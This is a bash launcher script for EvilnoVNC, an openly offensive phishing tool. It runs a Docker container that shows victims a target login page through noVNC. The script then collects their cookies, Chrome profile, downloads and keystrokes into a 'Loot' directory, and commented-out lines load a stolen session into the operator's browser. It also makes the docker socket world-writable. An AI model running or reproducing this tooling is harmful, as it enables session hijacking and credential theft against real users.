#!/bin/bash
#=============================#
#   EvilnoVNC by @JoelGMSec   #
#     https://darkbyte.net    #
#=============================#

# Banner
printf "
  _____       _ _          __     ___   _  ____
 | ____|_   _(_) |_ __   __\ \   / / \ | |/ ___|
 |  _| \ \ / / | | '_ \ / _ \ \ / /|  \| | |
 | |___ \ V /| | | | | | (_) \ V / | |\  | |___
 |_____| \_/ |_|_|_| |_|\___/ \_/  |_| \_|\____|
\n"
#\e[1;32m  ---------------- by @JoelGMSec --------------\n\e[1;0m" 

# Help & Usage
function help {
	printf "\n\e[1;33mUsage:\e[1;0m  ./start.sh \e[1;35m\$resolution \e[1;34m\$url\n\n"
	printf "\e[1;33mExamples:\n"
	printf "\e[1;32m\t1280x720  16bits: \e[1;0m./start.sh \e[1;35m1280x720x16 \e[1;34mhttp://example.com\n"
	printf "\e[1;32m\t1280x720  24bits: \e[1;0m./start.sh \e[1;35m1280x720x24 \e[1;34mhttp://example.com\n"
	printf "\e[1;32m\t1920x1080 16bits: \e[1;0m./start.sh \e[1;35m1920x1080x16 \e[1;34mhttp://example.com\n"
	printf "\e[1;32m\t1920x1080 24bits: \e[1;0m./start.sh \e[1;35m1920x1080x24 \e[1;34mhttp://example.com\n\n"
	printf "\e[1;33mDynamic resolution:\n"
	printf "\e[1;0m\t./start.sh \e[1;35mdynamic \e[1;34mhttp://example.com\n\n";
}

if [[ $# -lt 2 ]]; then
	help
	printf "\e[1;31m[!] Not enough parameters!\n\n"
	exit 1
fi

# Variables
RESOLUTION=$1
WEBPAGE=$2
SID=$3

function cleanup {
	printf "\n\e[1;31m[*] Stopping container "
	sudo rm -f ./tmp/resolution$SID.txt ./tmp/reqid$SID.txt ./tmp/useragent$SID.txt
	#printf "\n\e[1;33m[>] Import stealed session to Chromium..\n"
	#rm -Rf ~/.config/chromium/Default > /dev/null 2>&1
	#cp -R Downloads/Default ~/.config/chromium/ > /dev/null 2>&1
	#/bin/bash -c "/usr/bin/chromium --no-sandbox --disable-crash-reporter --password-store=basic &" > /dev/null 2>&1 &
	sudo docker stop -t 0 evil$SID #> /dev/null 2>&1 &
	printf "\t\e[1;31mContainer stopped!\n\e[1;0m"
}

# Main function
if docker -v &> /dev/null ; then
	if ! (( $(ps -ef | grep -v grep | grep docker | wc -l) > 0 )) ; then
		sudo service docker start > /dev/null 2>&1
		sleep 2
	fi
fi

if [[ $RESOLUTION == dynamic ]]; then
	sudo rm -rf ./tmp/resolution$SID.txt > /dev/null 2>&1
else
	echo $RESOLUTION > ./tmp/resolution$SID.txt
fi

sudo rm -rf ./tmp/reqid$SID.txt > /dev/null 2>&1
sudo rm -rf ./tmp/useragent$SID.txt > /dev/null 2>&1

#sudo docker run -d --rm -p 127.0.0.1:21212:80 -v "/tmp:/tmp" -v "${PWD}/Downloads":"/home/user/Downloads" -e "WEBPAGE=$WEBPAGE" -e "SNAME=$SNAME" --name evilnovnc joelgmsec/evilnovnc > /dev/null 2>&1
sudo docker run -d --rm --network evil \
	-v "${PWD}/tmp:/home/user/tmp" \
	-v "$(realpath ..)/submitlog.txt:/etc/submitlog.txt" \
	-v "$(realpath ..)/accesslog.txt:/etc/accesslog.txt" \
	-v "$(realpath ..)/Loot:/etc/Loot" \
	-e "WEBPAGE=$WEBPAGE" -e "SID=$SID" --name evil$SID evilnovnc

sudo chmod 666 /var/run/docker.sock

trap cleanup SIGTERM EXIT

printf "\n\e[1;33m[*] EvilnoVNC instance $SID is running serving $WEBPAGE"
printf "\n\t\e[1;33mPress Ctrl+C at any time to shut down"

if [[ $RESOLUTION == dynamic ]]; then
	printf "\n\t\e[1;33mWaiting for user interaction..."
	while [[ ! -f ./tmp/resolution$SID.txt ]]; do sleep 1; done
	RESOLUTION=$(head -1 ./tmp/resolution$SID.txt)
	[[ -f ./tmp/reqid$SID.txt ]] && REQID=$(head -1 ./tmp/reqid$SID.txt)
	[[ -f ./tmp/useragent$SID.txt ]] && USERA=$(head -1 ./tmp/useragent$SID.txt)
else
	printf "\n\e[1;32m[*] Avoiding dynamic resolution steps.."
fi

printf "\n\e[1;32m[+] Client connected"
printf "\n\t\e[1;32mRequest ID: \t\t$REQID"
printf "\n\t\e[1;32mResolution: \t\t$RESOLUTION"
printf "\n\t\e[1;32mUser Agent: \t\t$USERA"
printf "\n\t\e[1;32mDownloads: \t\t../Loot/[date-time]-$REQID/Downloads"
printf "\n\t\e[1;32mChrome profile: \t../Loot/[date-time]-$REQID/Chrome"
printf "\n\t\e[1;32mCookies: \t\t../Loot/[date-time]-$REQID/Downloads/cookies.txt"
printf "\n\t\e[1;32mKeylog: \t\t../Loot/[date-time]-$REQID/Downloads/keylog.txt"

while true ; do sleep 30 ; done 

